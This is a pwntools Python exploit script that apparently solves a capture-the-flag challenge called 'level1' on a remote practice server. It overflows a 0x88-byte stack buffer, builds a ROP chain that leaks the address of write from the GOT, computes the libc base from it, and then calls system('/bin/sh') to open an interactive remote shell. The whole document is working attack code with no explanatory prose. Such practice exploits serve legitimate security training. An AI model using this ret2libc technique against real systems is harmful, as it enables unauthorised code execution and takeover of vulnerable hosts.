from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../level1')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')
target = remote('node4.buuoj.cn', 27160)

# The remote server will not print the stack address unless the buffer is refreshed. So we cannot construct shellcraft on the stack because we cannot leak the address.

write_got = elf.got['write']
write_plt = elf.plt['write']
vuln = elf.sym['vulnerable_function']

# payload = b'a' * 0x88 + b'a' * 0x4 + p32(write_plt) + p32(vuln) + p32(1) + p32(write_got) + p32(4)
payload = utils.create_rop_payload(
  0x88, {0x1: [], write_got: [], 0x4: []}, 'i386', write_plt,
  fake_return_addrress=vuln)

target.sendline(payload)
write_addr = u32(target.recvuntil(b'\xf7')[-4:])
libc.address = write_addr - libc.sym['write']
system = libc.sym['system']
shell = next(libc.search(b'/bin/sh'))

payload = utils.create_rop_payload(0x88, {shell: []}, 'i386', system)
target.sendline(payload)
target.interactive()